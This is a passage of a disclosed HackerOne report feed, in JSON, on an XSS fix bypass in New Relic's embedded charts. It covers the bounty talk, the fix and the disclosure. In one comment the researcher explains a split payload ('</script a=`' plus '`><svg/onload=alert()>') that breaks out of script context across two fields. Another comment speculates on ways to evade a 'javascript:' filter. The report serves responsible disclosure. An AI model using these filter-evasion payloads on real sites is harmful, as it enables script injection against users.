bypass.","automated_response":false,"created_at":"2019-11-02T10:07:15.777Z","updated_at":"2019-11-02T10:07:15.777Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":623723,"filename":"______________2019-11-02___12.57.06.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8ForbgHcMV9aq1kDqP2vopFN?response-content-disposition=attachment%3B%20filename%3D%22______________2019-11-02___12.57.06.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-11-02___12.57.06.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151923Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=862f681279445c229b3db2429bc480a512ea32a2269f31ab574c4043b7de093a"},{"id":623719,"filename":"______________2019-11-02___12.54.02.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sV5bU55ipoiznf5fGBrgG4Hv?response-content-disposition=attachment%3B%20filename%3D%22______________2019-11-02___12.54.02.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-11-02___12.54.02.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151923Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=128729af2b31e4ce9b67af94a27ff1847a155fbdf262f54683cc545db43b650f"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6235721,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans,\n\nSorry for not getting back to you sooner. I was trying to figure out the status of some of our more vulnerable features hoping to be able to tell you we already had tickets to get rid of them entirely. Alas, I ended up disappointed. I'm going to reproduce this now and get back to you. Thank you for being patient.","automated_response":false,"created_at":"2019-11-06T20:52:05.561Z","updated_at":"2019-11-06T20:52:05.561Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6235824,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Will definitely be working with the team before marking this ticket resolved \n\n{F627625}","automated_response":false,"created_at":"2019-11-06T21:08:30.127Z","updated_at":"2019-11-06T21:08:30.127Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":627625,"filename":"facepalm_panda.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sWWWujUHzk3eBY9k2dK9Nboe?response-content-disposition=attachment%3B%20filename%3D%22facepalm_panda.gif%22%3B%20filename%2A%3DUTF-8%27%27facepalm_panda.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151923Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=048f1037935a1a64bd042b10136fd3173f78ef4c77e2d830793b0c01df6dc186"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6235951,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jmcaleer,\n\nIt this fix bypass eligible for some monetary reward? ;)","automated_response":false,"created_at":"2019-11-06T21:30:20.183Z","updated_at":"2019-11-06T21:30:20.183Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6236748,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You wrote earlier that “if you find a bypass you will be awarded with bonus”.","automated_response":false,"created_at":"2019-11-07T02:17:15.904Z","updated_at":"2019-11-07T02:17:15.904Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6243663,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Absolutely! I got a little deep into the weeds with *why* this was happening and forgot to make a ticket for it! Let's get you some cash!","automated_response":false,"created_at":"2019-11-07T17:49:40.849Z","updated_at":"2019-11-07T17:49:40.849Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6243714,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"This one deserves a little bit more of a bonus, because why would XSS work across fields??? That deserves extra.\n\n{F628505}","automated_response":false,"created_at":"2019-11-07T17:54:30.510Z","updated_at":"2019-11-07T17:54:30.510Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"625.0","attachments":[{"id":628505,"filename":"burn_money_cig.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7ngyacmp7D4NJBPRG69kTPiq?response-content-disposition=attachment%3B%20filename%3D%22burn_money_cig.gif%22%3B%20filename%2A%3DUTF-8%27%27burn_money_cig.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151923Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d32463329a2a28e59db36d55a48ec60df30dc2752689f8eb3287e47aebeb5f19"}],"genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"skavans","url":"/skavans"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6244056,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot @jmcaleer!\nI tried to explain why it works at my last screenshot, you can see there, what malicious HTML is generated from these two fields. If you have troubles with understanding, please let me know, and I will explain this deeper. I’m from phone now so it’s hard to write big messages. If you need an assistance, I’m always near :)\n\nAnd please, can you also take a look at my another fix bypass? It hangs for few days already...","automated_response":false,"created_at":"2019-11-07T18:23:44.490Z","updated_at":"2019-11-07T18:23:44.490Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6253930,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Guys,\n\nJust look here\n{F623723}\nAnd you will see how these 2 fields resulted in HTML which runs the malicious payload.\n\nThe main idea is that I need to break the script context to execute my payload instead, so I need to inject the closing script tag first. The `\u003c/script\u003e` is prohibited, but the `\u003c/script` isn't. So I started to close your script tag at `chart_type` with:\n```\n\u003c/script a=`\n```\n\nWhen a browser sees this inside a script tag (your legitimate one), it considers this as **closing script tag with some attributes**. Because `\u003c/script a=\"something\"\u003e` is actually valid HTML. It starts to find, where this closing tag is ended. And I inject\n```\n`\u003e\n```\ninto a chart title.\n\nSo the browser considers this as a long closing script tag, and a new HTML tag `svg` after:\n**\u003c/script a=`**some your long js parts **`\u003e\u003csvg/onload=alert()\u003e**\n\nIf you need some more assistance, just let me know.","automated_response":false,"created_at":"2019-11-08T11:46:34.483Z","updated_at":"2019-11-08T11:46:34.483Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8191275,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @skavans,\n\nSorry about the time this one took. We were planning on EOL-ing the feature, because the fixes thus far have been inadequate, but that got pushed back to August. I want to tell you about some of the work we've done to fix this in case it helps you find something here:\n- The `url` field of `/accounts/account_ID/embedded_charts.json` has been limited to valid APIs in New Relic\n- The query parameters of the `url` field have all been limited to valid query params\n- The values of the query parameters have all been sanitized in the following order: `javascript:` is turned into `javascript :`, [Rails SanitizerHelper](https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html) escaping tags, removal of double and single quotes, and HTML escaped with the Rails h method. I personally think the javascript sanitization can be gotten around by adding a tag or quote in the middle of it (eg. `java\u003ctag\u003escript:` or `java'script:`) but have been unable to accomplish this myself.\n\nI leave this information to you in the hopes you can make something of it that I couldn't. Please comment here if you find a bypass and I will get to it as soon as I see it.\n\n","automated_response":false,"created_at":"2020-06-03T15:26:25.028Z","updated_at":"2020-06-03T15:26:25.028Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"skavans","url":"/skavans"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8487926,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jmcaleer,\n\nSorry about late reply. It seems to be fixed now due to correct sanitizing of `\u003c\u003e` and quote chars.","automated_response":false,"created_at":"2020-07-03T08:22:01.683Z","updated_at":"2020-07-03T08:22:01.683Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8902603,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-11T09:36:43.764Z","updated_at":"2020-08-11T09:36:43.764Z","first_to_agree":true,"actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8923174,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can we disclose this?","automated_response":false,"created_at":"2020-08-13T08:30:57.769Z","updated_at":"2020-08-13T08:30:57.769Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8926855,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-13T13:47:26.618Z","updated_at":"2020-08-13T13:47:26.618Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8926856,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-13T13:47:26.727Z","updated_at":"2020-08-13T13:47:26.727Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}